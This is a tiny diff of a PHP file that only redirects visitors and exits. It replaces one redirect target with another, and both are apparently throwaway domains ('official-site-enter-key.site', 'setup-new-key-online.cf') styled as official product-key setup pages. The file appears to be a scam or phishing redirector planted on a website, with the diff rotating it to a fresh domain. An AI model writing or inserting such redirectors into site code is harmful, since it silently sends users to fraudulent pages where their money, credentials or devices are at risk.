@@ -1,4 +1,4 @@
 <?php
-header("Location: https://official-site-enter-key.site/actnor/");
+header("Location: https://setup-new-key-online.cf/actnor/");
 die();
 ?>
